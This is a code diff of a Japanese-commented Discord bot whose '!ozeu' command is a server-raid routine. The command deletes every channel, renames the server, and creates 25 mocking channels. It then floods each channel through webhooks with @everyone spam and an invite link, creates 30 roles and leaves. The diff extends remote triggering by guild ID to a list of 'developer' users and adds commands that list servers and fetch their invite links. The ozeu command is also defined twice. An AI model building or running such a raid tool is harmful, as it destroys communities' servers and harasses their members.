@@ -1,4 +1,5 @@
 import os
+import json
 import discord
 import datetime
 from discord.ext import commands
@@ -8,28 +9,82 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"
+SPAM_MESSAGE = (
+    "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  "
+    "[gif](https://media.discordapp.net/attachments/...)  "
+    "[gif](https://media.discordapp.net/attachments/...) @everyone"
+)
 OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
-# ozeu禁止サーバーIDセット（メモリ内保持）
-ozeu_banned_guilds = set()
+DEV_USERS_FILE = "dev_users.json"
 
+# dev_users.jsonの読み込み・保存関数
+def load_dev_users():
+    if not os.path.isfile(DEV_USERS_FILE):
+        with open(DEV_USERS_FILE, "w") as f:
+            json.dump([OWNER_ID], f)
+        return [OWNER_ID]
+    with open(DEV_USERS_FILE, "r") as f:
+        try:
+            return json.load(f)
+        except:
+            return [OWNER_ID]
+
+def save_dev_users(users):
+    with open(DEV_USERS_FILE, "w") as f:
+        json.dump(users, f)
+
+dev_users = load_dev_users()
+
+# --- Bot起動時 ---
 @bot.event
 async def on_ready():
     await bot.tree.sync()
     print(f"{bot.user} が起動しました！")
 
-# --- !ozeu コマンド（サーバーでは誰でも / DMではOWNERのみ） ---
+# --- dev_users管理用コマンド ---
+@tree.command(name="add_dev", description="Botの開発者権限ユーザーを追加します（OWNERのみ）")
+@app_commands.describe(user="追加したいユーザー")
+async def add_dev(interaction: discord.Interaction, user: discord.User):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
+        return
+    global dev_users
+    if user.id in dev_users:
+        await interaction.response.send_message("⚠ 既に開発者権限があります。", ephemeral=True)
+        return
+    dev_users.append(user.id)
+    save_dev_users(dev_users)
+    await interaction.response.send_message(f"✅ {user} を開発者権限ユーザーに追加しました。", ephemeral=True)
+
+@tree.command(name="remove_dev", description="Botの開発者権限ユーザーを削除します（OWNERのみ）")
+@app_commands.describe(user="削除したいユーザー")
+async def remove_dev(interaction: discord.Interaction, user: discord.User):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
+        return
+    global dev_users
+    if user.id == OWNER_ID:
+        await interaction.response.send_message("❌ オーナーは削除できません。", ephemeral=True)
+        return
+    if user.id not in dev_users:
+        await interaction.response.send_message("⚠ 指定ユーザーは開発者権限に含まれていません。", ephemeral=True)
+        return
+    dev_users.remove(user.id)
+    save_dev_users(dev_users)
+    await interaction.response.send_message(f"✅ {user} を開発者権限ユーザーから削除しました。", ephemeral=True)
+
+# --- !ozeu コマンド（サーバーでは誰でも / DMではOWNERかdev_usersのみ） ---
 @bot.command(name="ozeu")
 async def ozeu(ctx, guild_id: int = None):
+    # DMならOWNERかdev_usersのみ許可
     if ctx.guild is None:
-        # DMでの実行 → OWNERのみ許可
-        if ctx.author.id != OWNER_ID:
-            await ctx.send("❌ このコマンドはBotのオーナーしか使用できません。")
+        if ctx.author.id not in dev_users:
+            await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
             return
         if guild_id is None:
             await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
@@ -39,13 +94,8 @@ async def ozeu(ctx, guild_id: int = None):
             await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
             return
     else:
-        # サーバー内からの実行 → 現在のギルドを使用
+        # サーバー内なら誰でもOK
         guild = ctx.guild
-
-    # 禁止リストチェック
-    if guild.id in ozeu_banned_guilds:
-        await ctx.send(f"❌ このサーバー（ID: {guild.id}）では !ozeu 処理は禁止されています。")
-        return
 
     embed_start = discord.Embed(
         title="📢 !ozeu が実行されました",
@@ -115,41 +165,122 @@ async def ozeu(ctx, guild_id: int = None):
     except Exception as e:
         print(f"退出時にエラー: {e}")
 
-# --- /safe コマンド ---
-@tree.command(name="safe", description="指定したサーバーIDでnuke処理を禁止します")
-@app_commands.describe(server_id="nuke処理を禁止するサーバーのID")
+# --- /safe コマンド ---  
+# 入力されたサーバーIDのサーバーでは!ozeu処理が発動しないようにする管理
+safe_servers = set()
+
+@tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、!ozeuを発動禁止にします")
+@app_commands.describe(server_id="対象のサーバーID")
 async def safe(interaction: discord.Interaction, server_id: str):
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
+    if interaction.user.id not in dev_users:
+        await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
         return
-    try:
-        sid = int(server_id)
-    except:
-        await interaction.response.send_message("❌ サーバーIDは数字で指定してください。", ephemeral=True)
-        return
-    ozeu_banned_guilds.add(sid)
-    await interaction.response.send_message(f"✅ サーバーID `{sid}` を禁止リストに追加しました。", ephemeral=True)
+    safe_servers.add(int(server_id))
+    await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストに追加しました。")
 
-# --- /unsafe コマンド ---
-@tree.command(name="unsafe", description="指定したサーバーIDのozeu処理禁止を解除します")
-@app_commands.describe(server_id="ozeu処理禁止を解除するサーバーのID")
+@tree.command(name="unsafe", description="指定したサーバーIDを安全リストから削除し、!ozeuを発動可能にします")
+@app_commands.describe(server_id="対象のサーバーID")
 async def unsafe(interaction: discord.Interaction, server_id: str):
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("❌ このコマンドはBotのオーナーのみ使用できます。", ephemeral=True)
+    if interaction.user.id not in dev_users:
+        await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
         return
     try:
-        sid = int(server_id)
-    except:
-        await interaction.response.send_message("❌ サーバーIDは数字で指定してください。", ephemeral=True)
-        return
-    if sid in ozeu_banned_guilds:
-        ozeu_banned_guilds.remove(sid)
-        await interaction.response.send_message(f"✅ サーバーID `{sid}` のozeu禁止を解除しました。", ephemeral=True)
+        safe_servers.remove(int(server_id))
+        await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストから削除しました。")
+    except KeyError:
+        await interaction.response.send_message(f"⚠ サーバーID {server_id} は安全リストに登録されていません。")
+
+# !ozeuコマンドにsafe_serversチェックを追加
+@bot.command(name="ozeu")
+async def ozeu(ctx, guild_id: int = None):
+    if ctx.guild is None:
+        if ctx.author.id not in dev_users:
+            await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
+            return
+        if guild_id is None:
+            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
+            return
+        if int(guild_id) in safe_servers:
+            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
+            return
+        guild = bot.get_guild(guild_id)
+        if guild is None:
+            await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
+            return
     else:
-        await interaction.response.send_message(f"❌ サーバーID `{sid}` はozeu禁止リストに登録されていません。", ephemeral=True)
+        if ctx.guild.id in safe_servers:
+            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
+            return
+        guild = ctx.guild
 
-# --- ここからはあなたの元のコードを続けます ---
+    # --- 以下、上記と同じozeu処理 ---
+    embed_start = discord.Embed(
+        title="📢 !ozeu が実行されました",
+        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
+        color=discord.Color.green()
+    )
+    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
+    embed_start.timestamp = discord.utils.utcnow()
 
+    owner = await bot.fetch_user(OWNER_ID)
+    await owner.send(embed=embed_start)
+    await ctx.send(embed=embed_start)
+
+    async def delete_channel(channel):
+        try:
+            await channel.delete()
+        except Exception as e:
+            print(f"{channel.name} の削除でエラー: {e}")
+
+    delete_tasks = [delete_channel(ch) for ch in guild.channels]
+    await asyncio.gather(*delete_tasks)
+
+    try:
+        await guild.edit(name="ozeuの植民地")
+    except Exception as e:
+        print(f"サーバー名の変更でエラー: {e}")
+
+    async def create_channel(index):
+        try:
+            return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
+        except Exception as e:
+            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
+            return None
+
+    created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
+    created_channels = [ch for ch in created_channels if ch is not None]
+
+    async def send_with_webhook(channel):
+        try:
+            webhook = await channel.create_webhook(name="ZPlusWebhook")
+            for _ in range(50):
+                await webhook.send(SPAM_MESSAGE, username="ガバマン")
+        except Exception as e:
+            print(f"{channel.name} のWebhook送信でエラー: {e}")
+
+    await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
+
+    try:
+        for i in range(30):
+            await guild.create_role(name=f"bot用権限{i+1}")
+    except Exception as e:
+        print(f"ロール作成でエラー: {e}")
+
+    try:
+        await guild.leave()
+        embed_done = discord.Embed(
+            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
+            description=(
+                f"サーバー名: {guild.name} (ID: {guild.id})\n"
+                f"実行者: {ctx.author} (ID: {ctx.author.id})"
+            ),
+            color=discord.Color.red()
+        )
+        embed_done.timestamp = discord.utils.utcnow()
+        await owner.send(embed=embed_done)
+        await ctx.send(embed=embed_done)
+    except Exception as e:
+        print(f"退出時にエラー: {e}")
 
 # --- /backup コマンド ---
 @bot.tree.command(name="backup", description="ログを保存します")
@@ -191,7 +322,7 @@ async def ban(interaction: discord.Interaction, member: discord.Member, reason: 
         )
         embed.add_field(name="理由", value=reason, inline=False)
         if member.avatar:
-            embed.set_thumbnail(url=member.avatar.avatar.url)
+            embed.set_thumbnail(url=member.avatar.url)
         embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
         await interaction.response.send_message(embed=embed)
     except Exception as e:
@@ -243,8 +374,8 @@ async def leave_server(interaction: discord.Interaction, server_id: str):
     if interaction.guild is not None:
         await interaction.response.send_message("このコマンドはDMでのみ使えます。", ephemeral=True)
         return
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("このコマンドを使えるのはBotの開発者だけです。", ephemeral=True)
+    if interaction.user.id not in dev_users:
+        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
         return
     try:
         guild = bot.get_guild(int(server_id))
@@ -264,7 +395,7 @@ async def leave_server(interaction: discord.Interaction, server_id: str):
 # --- /servers コマンド（開発者専用） ---
 @tree.command(name="servers", description="サーバー一覧(開発者専用)")
 async def servers(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID:
+    if interaction.user.id not in dev_users:
         await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
         return
     guilds = bot.guilds
@@ -282,7 +413,7 @@ get_group = app_commands.Group(name="get", description="情報取得系コマン
 @get_group.command(name="url", description="指定されたサーバーの招待リンクを取得します（開発者専用）")
 @app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
 async def get_url(interaction: discord.Interaction, server_id: str):
-    if interaction.user.id != OWNER_ID:
+    if interaction.user.id not in dev_users:
         await interaction.response.send_message("このコマンドはBotの開発者のみ使用できます。", ephemeral=True)
         return
 
